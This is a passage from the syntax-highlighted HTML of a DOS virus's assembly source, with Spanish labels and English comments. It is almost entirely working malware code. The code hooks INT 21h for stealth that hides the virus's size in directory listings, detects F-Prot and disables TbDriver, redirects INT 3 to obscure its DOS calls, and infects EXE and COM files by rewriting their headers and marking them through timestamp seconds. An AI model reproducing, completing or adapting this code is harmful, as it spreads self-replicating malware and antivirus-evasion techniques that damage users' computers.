                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">No_infectado</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Normal_FCB</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
</span><span class="sc5">Normal_FCB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">No_infectado</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc5">Virus_size</span><span class="sc0"> </span><span class="sc1">; Old lenght of</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;file and "normal"</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0F1h</span><span class="sc0">       </span><span class="sc1">;seconds</span><span class="sc0">

</span><span class="sc5">No_infectado</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">condiciones</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">sin_nada</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc2">029Ah</span><span class="sc0">      </span><span class="sc1">; Virus's payload</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">sin_nada</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Sin_stealth</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                                INT 21h</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">main_center</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; The main center !</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">stealth_tiempo</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fcb_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fcb_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">handle_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">handle_stealth</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ejecutar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">saltito</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                             HANDLE STEALTH</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">handle_stealth</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; Handle stealth, functions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Int21h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;4eh/4fh</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">adios_handle</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">anti_antivirus</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">; Is it F-prot ?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">fpr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'-F'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">sin_infectar</span><span class="sc0">            </span><span class="sc1">; Si lo es, pasamos de hacer</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;el stealth</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">fpr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">sin_infectar</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc5">Virus_size</span><span class="sc0"> </span><span class="sc1">; Subs virus size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;and places coherent</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc2">0F1h</span><span class="sc0">       </span><span class="sc1">;seconds</span><span class="sc0">

</span><span class="sc5">sin_infectar</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">condiciones</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">029Ah</span><span class="sc0">      </span><span class="sc1">; payload</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">adios_handle</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;                             EXE INFECTION</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">ejecutar</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tbdriver</span><span class="sc0">                </span><span class="sc1">; deactivates TbDriver</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3503h</span><span class="sc0">                </span><span class="sc1">; Int 3h points to the</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;int 21h: less size and we</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;fuck'em a bit</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">saltito</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">                </span><span class="sc1">; We handle int 24h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int24h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">Noloes</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">                </span><span class="sc1">; Saves and clears file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                      </span><span class="sc1">;attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">

</span><span class="sc5">vamos_a_ver_si_exe</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">flag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; Opens file</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">we_close</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                  </span><span class="sc1">; Reads header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">cabecera</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Makes comprobations</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc12">'Z'</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_close</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">go_close</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_close</span><span class="sc0">                </span><span class="sc1">; If it's all right, goes on</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">conti</span><span class="sc0">

</span><span class="sc5">go_close</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">buscar_final</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Searches end in ds:si</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chequeo</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">buscar_final</span><span class="sc0">

</span><span class="sc5">chequeo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; Is it a  .COM ?</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">comtxt</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmpsw</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">we_close</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infeccion_com</span><span class="sc0">

</span><span class="sc5">we_close</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">conti</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; Time/date of file</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_ant</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pointerant</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">contt</span><span class="sc0">
</span><span class="sc5">noinz</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; To avoid changing</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_ant</span><span class="sc0">                   </span><span class="sc1">;date of non-infected</span><span class="sc0">
                                                    </span><span class="sc1">;files</span><span class="sc0">
</span><span class="sc5">contt</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">cabecera</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cs_ip</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ss_sp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cs_ip</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ss_sp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],((</span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">-</span><span class="sc2">15h</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pointerant</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cabecera</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],((</span><span class="sc5">virus_size</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">cabecera</span><span class="sc0">
